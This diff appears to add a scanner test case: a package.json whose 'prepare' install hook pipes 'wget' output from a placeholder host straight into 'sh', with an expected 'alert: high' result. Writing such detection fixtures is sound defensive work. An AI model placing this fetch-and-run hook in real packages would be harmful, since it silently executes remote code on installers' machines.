@@ -1,0 +1,9 @@
+prepare script piping wget output into a shell.
+alert: high
+-- package.json --
+{
+  "name": "app",
+  "scripts": {
+    "prepare": "wget -qO- https://example.invalid/s | sh"
+  }
+}
